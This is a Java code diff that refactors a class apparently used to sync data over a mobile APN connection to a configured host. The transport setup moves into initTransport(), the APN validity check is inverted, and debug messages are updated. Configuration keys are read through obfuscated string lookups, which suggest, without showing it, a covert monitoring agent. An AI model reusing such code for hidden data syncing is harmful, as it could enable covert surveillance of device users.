@@ -24,19 +24,19 @@ public class SyncActionApn extends SyncAction {
     //#endif
 
     String host;
+    Apn apn;
 
     public SyncActionApn(ConfAction conf) {
         super(conf);
     }
 
     protected boolean parse(final ConfAction params) {
-        Apn apn;
 
         try {
             host = params.getString(Messages.getString("d.1")); //$NON-NLS-1$
 
             //#ifdef DEBUG
-            debug.trace("host: " + host); //$NON-NLS-1$
+            debug.trace("parse host: " + host); //$NON-NLS-1$
             //#endif
 
             apn = new Apn();
@@ -46,17 +46,11 @@ public class SyncActionApn extends SyncAction {
             apn.user = apnConf.getString(Messages.getString("d.6")); //$NON-NLS-1$
             apn.pass = apnConf.getString(Messages.getString("d.7")); //$NON-NLS-1$
 
-            if (apn.isValid()) {
+            if (!apn.isValid()) {
                 //#ifdef DEBUG
-                debug.trace("adding apn: " + apn); //$NON-NLS-1$
+                debug.error("parse, apn not valid");
                 //#endif
-
-                transports.addElement(new ApnTransport(host, apn));
-
-            } else {
-                //#ifdef DEBUG
-                debug.trace("No valid apn"); //$NON-NLS-1$
-                //#endif
+                return false;
             }
 
         } catch (final ConfigurationException e) {
@@ -69,6 +63,11 @@ public class SyncActionApn extends SyncAction {
     }
 
     protected boolean initTransport() {
+        //#ifdef DEBUG
+        debug.trace("initTransport");
+        //#endif
+        
+        transports.addElement(new ApnTransport(host, apn));
         return true;
     }
 
